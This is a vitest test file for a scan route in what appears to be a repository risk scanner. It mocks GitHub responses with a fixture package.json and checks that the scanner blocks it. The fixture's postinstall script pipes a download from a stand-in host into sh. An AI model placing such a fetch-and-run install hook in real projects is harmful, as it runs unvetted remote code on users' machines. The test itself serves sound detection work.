import { afterEach, describe, expect, it, vi } from "vitest";
import { POST } from "./route";

const originalFetch = globalThis.fetch;

function requestFor(target: string): Request {
  return new Request("http://localhost/api/scan", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ target })
  });
}

function mockGithubFetch() {
  globalThis.fetch = vi.fn(async (input: string | URL | Request) => {
    const url = String(input);
    if (url === "https://api.github.com/repos/acme/risky-demo") {
      return new Response(JSON.stringify({ default_branch: "main" }), { status: 200 });
    }
    if (url.includes("/git/trees/main")) {
      return new Response(
        JSON.stringify({
          tree: [{ path: "package.json", type: "blob", size: 160 }]
        }),
        { status: 200 }
      );
    }
    if (url.includes("raw.githubusercontent.com/acme/risky-demo/main/package.json")) {
      return new Response(
        [
          "{",
          '  "name": "risky-demo",',
          '  "version": "1.0.0",',
          '  "scripts": {',
          '    "postinstall": "curl https://example.invalid/install.sh | sh"',
          "  }",
          "}"
        ].join("\n"),
        { status: 200 }
      );
    }
    return new Response("not found", { status: 404 });
  }) as typeof fetch;
}

afterEach(() => {
  globalThis.fetch = originalFetch;
  vi.restoreAllMocks();
});

describe("scan route", () => {
  it("calls the real scan engine for a GitHub URL", async () => {
    mockGithubFetch();

    const response = await POST(requestFor("https://github.com/acme/risky-demo"));
    const body = (await response.json()) as {
      report: {
        verdict: string;
        findings: Array<{ ruleId: string; filePath: string; startLine: number; evidence: string }>;
        validationErrors: unknown[];
      };
      markdown: string;
    };

    expect(response.status).toBe(200);
    expect(body.report.verdict).toBe("BLOCK");
    expect(body.report.findings.some((finding) => finding.ruleId === "SCRIPT_REMOTE_EXEC_CRITICAL")).toBe(true);
    expect(body.report.findings.some((finding) => finding.filePath === "package.json" && finding.startLine === 5)).toBe(true);
    expect(body.report.findings[0].evidence).toContain("postinstall");
    expect(body.report.validationErrors).toEqual([]);
    expect(body.markdown).toContain("# VibeProof Risk Report");
  });

  it("rejects non-GitHub URLs", async () => {
    const response = await POST(requestFor("https://example.com/acme/risky-demo"));
    const body = (await response.json()) as { error: string };

    expect(response.status).toBe(400);
    expect(body.error).toContain("public https://github.com/owner/repo URLs");
  });
});
